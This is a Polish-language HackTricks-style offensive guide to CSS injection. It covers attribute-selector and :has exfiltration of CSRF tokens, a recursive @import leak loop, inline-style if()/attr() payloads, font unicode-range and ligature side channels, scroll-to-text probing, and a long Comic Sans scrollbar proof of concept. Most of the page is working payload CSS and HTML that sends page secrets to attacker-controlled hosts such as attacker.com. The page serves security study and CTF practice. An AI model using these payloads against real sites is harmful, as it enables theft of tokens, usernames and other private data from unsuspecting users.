# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Selektor atrybutu

Selektory CSS są skonstruowane tak, aby dopasowywać wartości atrybutów `name` i `value` elementu `input`. Jeśli atrybut `value` elementu `input` zaczyna się od określonego znaku, ładowany jest wstępnie zdefiniowany zewnętrzny zasób:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Jednak to podejście napotyka ograniczenie w przypadku ukrytych elementów input (`type="hidden"`), ponieważ elementy ukryte nie ładują tła.

#### Obejście dla ukrytych elementów

Aby obejść to ograniczenie, możesz zaadresować kolejny element-sąsiad, używając ogólnego kombinatora `~` (general sibling combinator). Reguła CSS zostanie wtedy zastosowana do wszystkich elementów następujących po ukrytym elemencie input, powodując załadowanie obrazu tła:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [tutaj](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Wymagania wstępne dla CSS Injection

For the CSS Injection technique to be effective, certain conditions must be met:

1. **Payload Length**: Wektor CSS injection musi obsługiwać wystarczająco długie payloady, aby pomieścić skonstruowane selektory.
2. **CSS Re-evaluation**: Powinieneś mieć możliwość umieszczenia strony w ramce, co jest niezbędne do wywołania ponownej oceny CSS z nowo wygenerowanymi payloadami.
3. **External Resources**: Technika zakłada możliwość używania obrazów hostowanych zewnętrznie. To może być ograniczone przez Content Security Policy (CSP).

### Blind Attribute Selector

As [**wyjaśniono w tym poście**](https://portswigger.net/research/blind-css-exfiltration), możliwe jest połączenie selektorów **`:has`** i **`:not`** w celu zidentyfikowania zawartości nawet z elementów niewidocznych. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Łącząc to z następującą techniką **@import**, możliwe jest przeprowadzenie eksfiltracji dużej ilości **informacji za pomocą CSS injection ze stron blind przy użyciu** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Poprzednia technika ma pewne wady — sprawdź wymagania wstępne. Musisz albo móc **wysłać wiele linków do victim**, albo musisz móc **iframe the CSS injection vulnerable page**.

Jest jednak inna sprytna technika, która wykorzystuje **CSS `@import`**, aby poprawić skuteczność metody.

Po raz pierwszy pokazał to [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) i działa to w ten sposób:

Zamiast ładować tę samą stronę w kółko z dziesiątkami różnych payloads za każdym razem (jak w poprzednim przypadku), zamierzamy **load the page just once and just with an import to the attackers server** (to jest payload do wysłania do victim):
```css
@import url("//attacker.com:5001/start?");
```
1. The import będzie **otrzymywał some CSS script** od attackers i **browser go załaduje**.
2. Pierwsza część CSS scriptu, którą attacker wyśle, to **kolejne `@import` do attackers server ponownie.**
1. attackers server nie odpowie na to żądanie jeszcze, ponieważ chcemy leakować kilka znaków, a potem odpowiedzieć na to import z payloadem, aby leakować kolejne.
3. Druga i większa część payloadu będzie **attribute selector leakage payload**
1. To wyśle do attackers server **pierwszy i ostatni znak secret**
4. Gdy attackers server otrzyma **pierwszy i ostatni znak secret**, odpowie na import zażądany w kroku 2.
1. Odpowiedź będzie dokładnie taka sama jak w **krokach 2, 3 i 4**, ale tym razem spróbuje znaleźć **drugi znak secret, a następnie przedostatni**.

Attacker będzie powtarzał tę pętlę aż uda mu się leakować cały secret.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> The script will try to discover 2 chars each time (from the beginning and from the end) because the attribute selector allows to do things like:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> This allows the script to leak the secret faster.

> [!WARNING]
> Czasami the script **nie wykryje poprawnie, że odkryty prefix + suffix to już kompletny flag** i będzie kontynuował do przodu (w prefixie) i do tyłu (w suffixie) i w pewnym momencie zawiśnie.\
> Bez obaw — sprawdź po prostu **output**, ponieważ **możesz tam zobaczyć flag**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

This primitive umożliwia exfiltration używając jedynie inline style attribute elementu, bez selectorów czy zewnętrznych stylesheetów. Opiera się na CSS custom properties, funkcji attr() do czytania atrybutów tego samego elementu, nowych warunkach CSS if() dla rozgałęzień oraz image-set() do wywołania żądania sieciowego, które zakoduje dopasowaną wartość.

> [!WARNING]
> Equality comparisons w if() wymagają double quotes dla string literals. Single quotes nie będą pasować.

- Sink: kontroluj atrybut style elementu i upewnij się, że docelowy atrybut jest na tym samym elemencie (attr() czyta tylko same-element attributes).
- Read: skopiuj atrybut do zmiennej CSS: `--val: attr(title)`.
- Decide: wybierz URL używając zagnieżdżonych conditionals porównujących zmienną z kandydatami stringów: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: zastosuj `background: image-set(var(--steal))` (lub dowolną właściwość wywołującą fetch) aby wymusić żądanie do wybranego endpointu.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Działający payload (w porównaniu wymagane podwójne cudzysłowy):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Enumerowanie wartości atrybutów z zagnieżdżonymi warunkami:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Realistyczne demo (sondowanie nazw użytkowników):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Uwagi i ograniczenia:

- Działa na przeglądarkach opartych na Chromium w czasie badań; zachowanie może się różnić na innych silnikach.
- Najlepiej nadaje się do skończonych/wyliczalnych przestrzeni wartości (IDs, flags, short usernames). Kradzież dowolnie długich ciągów bez zewnętrznych arkuszy stylów pozostaje wyzwaniem.
- Każda właściwość CSS, która pobiera URL, może zostać użyta do wywołania żądania (np. background/image-set, border-image, list-style, cursor, content).

Automatyzacja: Burp Custom Action może generować zagnieżdżone inline-style payloads do brute-force wartości atrybutów: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Inne selektory

Inne sposoby dostępu do części DOM za pomocą **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: To wyszuka drugi element z klasą "class-to-search" w DOM.
- **`:empty`** selektor: Użyty na przykład w [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Ogólnym celem jest **użycie niestandardowej czcionki z kontrolowanego endpointu** i upewnienie się, że **tekst (w tym przypadku 'A') jest wyświetlany tą czcionką tylko jeśli określony zasób (`favicon.ico`) nie może zostać załadowany**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Użycie niestandardowej czcionki**:

- Niestandardowa czcionka jest zdefiniowana za pomocą reguły `@font-face` wewnątrz znacznika `<style>` w sekcji `<head>`.
- Czcionka nosi nazwę `poc` i jest pobierana z zewnętrznego endpointu (`http://attacker.com/?leak`).
- Właściwość `unicode-range` jest ustawiona na `U+0041`, celując w konkretny znak Unicode 'A'.

2. **Element Object z tekstem zapasowym**:
- W sekcji `<body>` utworzono element `<object>` z `id="poc0"`. Element ten próbuje załadować zasób z `http://192.168.0.1/favicon.ico`.
- Dla tego elementu `font-family` jest ustawione na `'poc'`, zgodnie z definicją w sekcji `<style>`.
- Jeśli zasób (`favicon.ico`) nie załaduje się, zostanie wyświetlona zawartość zapasowa (litera 'A') wewnątrz znacznika `<object>`.
- Zawartość zapasowa ('A') zostanie wyrenderowana przy użyciu niestandardowej czcionki `poc`, jeśli zewnętrzny zasób nie będzie dostępny.

### Stylowanie fragmentu Scroll-to-text

Pseudoklasa **`:target`** jest używana do wyboru elementu wskazanego przez **fragment URL**, zgodnie ze specyfikacją [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Należy pamiętać, że `::target-text` nie dopasowuje żadnych elementów, chyba że tekst jest wyraźnie wskazany przez fragment.

Pojawia się problem bezpieczeństwa, gdy attackers wykorzystują funkcję **Scroll-to-text**, co pozwala im potwierdzić obecność konkretnego tekstu na stronie poprzez załadowanie zasobu z ich serwera za pomocą HTML injection. Metoda polega na wstrzyknięciu reguły CSS takiej jak ta:
```css
:target::before {
content: url(target.png);
}
```
W takich scenariuszach, jeśli na stronie obecny jest tekst "Administrator", zasób `target.png` zostaje zażądany z serwera, co wskazuje na obecność tego tekstu. Wykonanie takiego ataku może nastąpić za pomocą specjalnie spreparowanego URL-a, który osadza wstrzyknięty CSS wraz z fragmentem Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
W tym przypadku atak manipuluje HTML injection, aby przesłać kod CSS, celując w konkretny tekst "Administrator" za pomocą Scroll-to-text fragment (`#:~:text=Administrator`). Jeśli tekst zostanie znaleziony, wskazany zasób zostaje załadowany, niezamierzenie sygnalizując jego obecność atakującemu.

Aby złagodzić ryzyko, należy zwrócić uwagę na następujące punkty:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) został zaprojektowany do dopasowywania jedynie słów lub zdań, co ogranicza jego zdolność do leakowania dowolnych sekretów lub tokenów.
2. **Restriction to Top-level Browsing Contexts**: STTF działa wyłącznie w top-level browsing contexts i nie funkcjonuje w iframes, co sprawia, że każda próba eksploatacji jest bardziej zauważalna dla użytkownika.
3. **Necessity of User Activation**: STTF wymaga user-activation gesture, aby działać, co oznacza, że eksploatacje są możliwe tylko poprzez nawigacje inicjowane przez użytkownika. Wymóg ten znacząco zmniejsza ryzyko automatyzacji ataków bez interakcji użytkownika. Niemniej jednak autor posta na blogu wskazuje na konkretne warunki i obejścia (np. social engineering, interakcja z popularnymi rozszerzeniami przeglądarki), które mogą ułatwić automatyzację ataku.

Świadomość tych mechanizmów i potencjalnych podatności jest kluczowa dla utrzymania bezpieczeństwa sieci i ochrony przed takimi taktykami eksploatacji.

Aby uzyskać więcej informacji, sprawdź oryginalny raport: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Możesz sprawdzić [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Możesz określić **zewnętrzne fonty dla konkretnych wartości unicode**, które zostaną pobrane tylko wtedy, gdy te wartości unicode są obecne na stronie. Na przykład:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
Gdy uzyskasz dostęp do tej strony, Chrome i Firefox pobierają "?A" i "?B", ponieważ węzeł tekstowy sensitive-information zawiera znaki "A" i "B". Ale Chrome i Firefox nie pobierają "?C", ponieważ nie zawiera "C". To oznacza, że udało nam się odczytać "A" i "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Źródło:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Opisana technika polega na wydobywaniu tekstu z węzła przez wykorzystanie ligatur czcionek i monitorowanie zmian szerokości. Proces obejmuje kilka kroków:

1. **Creation of Custom Fonts**:

- Tworzone są SVG fonts z glyphami mającymi atrybut `horiz-adv-x`, który ustawia dużą szerokość dla glypha reprezentującego sekwencję dwóch znaków.
- Przykładowy SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gdzie "XY" oznacza sekwencję dwóch znaków.
- Te czcionki są następnie konwertowane do formatu woff za pomocą fontforge.

2. **Detection of Width Changes**:

- CSS jest używany, aby tekst nie zawijał się (`white-space: nowrap`) oraz aby dostosować styl paska przewijania.
- Pojawienie się poziomego paska przewijania, wystylizowanego w odmienny sposób, działa jako wskaźnik (oracle), że dana ligatura, a więc konkretna sekwencja znaków, jest obecna w tekście.
- Zaangażowany CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Step 1**: Tworzone są czcionki dla par znaków o znacznej szerokości.
- **Step 2**: Wykorzystywany jest trik oparty na pasku przewijania, aby wykryć, kiedy renderowany jest glyph o dużej szerokości (ligatura dla pary znaków), co wskazuje na obecność tej sekwencji znaków.
- **Step 3**: Po wykryciu ligatury generowane są nowe glyphy reprezentujące sekwencje trzyznakowe, łącząc wykrytą parę z poprzedzającym lub następującym znakiem.
- **Step 4**: Przeprowadzane jest wykrycie trzyznakowej ligatury.
- **Step 5**: Proces się powtarza, stopniowo odsłaniając cały tekst.

4. **Optimization**:
- Obecna metoda inicjalizacji używająca `<meta refresh=...` nie jest optymalna.
- Bardziej wydajne podejście mogłoby wykorzystać sztuczkę CSS `@import`, poprawiając wydajność exploita.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Źródło:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ten trik został opublikowany w tym [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). Zestaw znaków użyty w węźle tekstowym może nastąpić leak przy użyciu domyślnych czcionek zainstalowanych w przeglądarce: nie są potrzebne żadne czcionki zewnętrzne ani niestandardowe.

Koncepcja opiera się na wykorzystaniu animacji do stopniowego zwiększania szerokości `div`, pozwalając jednemu znakowi na raz przejść z części 'sufiks' tekstu do części 'prefiks'. Proces ten efektywnie dzieli tekst na dwie sekcje:

1. **Prefiks**: linia początkowa.
2. **Sufiks**: kolejna linia(y).

Etapy przejścia znaków będą wyglądać następująco:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Podczas tego przejścia wykorzystywany jest trik unicode-range do identyfikacji każdego nowego znaku, gdy dołącza do prefiksu. Osiąga się to przez zmianę czcionki na Comic Sans, która jest zauważalnie wyższa niż domyślna czcionka, w konsekwencji wywołując pionowy pasek przewijania. Pojawienie się tego paska przewijania pośrednio ujawnia obecność nowego znaku w prefiksie.

Chociaż ta metoda pozwala wykryć unikalne znaki w miarę ich pojawiania się, nie określa, który znak jest powtórzony — informuje jedynie, że wystąpiło powtórzenie.

> [!TIP]
> Zasadniczo, **unicode-range is used to detect a char**, ale ponieważ nie chcemy ładować zewnętrznej czcionki, musimy znaleźć inne rozwiązanie.\
> Kiedy **char** zostanie **znaleziony**, jest mu **przypisywana** preinstalowana czcionka **Comic Sans**, która **powiększa** char i **wywołuje pasek przewijania**, który spowoduje **leak znalezionego char**.

Sprawdź kod wyciągnięty z PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Jest to wspomniane jako [nieudane rozwiązanie w tym writeupie](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

This case is very similar to the previous one, however, in this case the goal of making specific **chars bigger than other is to hide something** like a button to not be pressed by the bot or a image that won't be loaded. So we could measure the action (or lack of the action) and know if a specific char is present inside the text.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Jest to wspomniane jako [nieudane rozwiązanie w tym writeupie](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku możemy spróbować leakować, czy dany znak znajduje się w tekście, ładując fałszywą czcionkę z tej samej domeny:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
If there is a match, the **czcionka zostanie załadowana z `/static/bootstrap.min.css?q=1`**. Chociaż nie załaduje się poprawnie, **przeglądarka powinna ją zapisać w pamięci podręcznej**, a nawet jeśli nie ma cache, istnieje mechanizm **304 not modified**, więc **odpowiedź powinna być szybsza** niż inne rzeczy.

Jednak jeśli różnica czasowa między odpowiedzią z cache i tą bez cache nie jest wystarczająco duża, to nie będzie to użyteczne. Na przykład autor wspomniał: Po testach odkryłem, że pierwszy problem polega na tym, że prędkość nie różni się znacząco, a drugi problem to to, że bot używa flagi `disk-cache-size=1`, co jest naprawdę przemyślane.

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencja:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku możesz wskazać **CSS do załadowania setek fałszywych czcionek** z tej samej domeny, gdy wystąpi dopasowanie. W ten sposób możesz **zmierzyć czas**, jaki to zajmuje, i sprawdzić, czy dany znak pojawia się, czy nie, używając czegoś w stylu:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
A kod bota wygląda tak:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Więc jeśli czcionka nie pasuje, czas odpowiedzi podczas odwiedzania bota powinien wynosić około 30 sekund. Jednak jeśli jest dopasowanie czcionki, zostanie wysłanych wiele żądań aby pobrać czcionkę, powodując ciągłą aktywność sieciową. W rezultacie spełnienie warunku zatrzymania i otrzymanie odpowiedzi zajmie więcej czasu. Dlatego czas odpowiedzi można wykorzystać jako wskaźnik do ustalenia, czy występuje dopasowanie czcionki.

## References

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
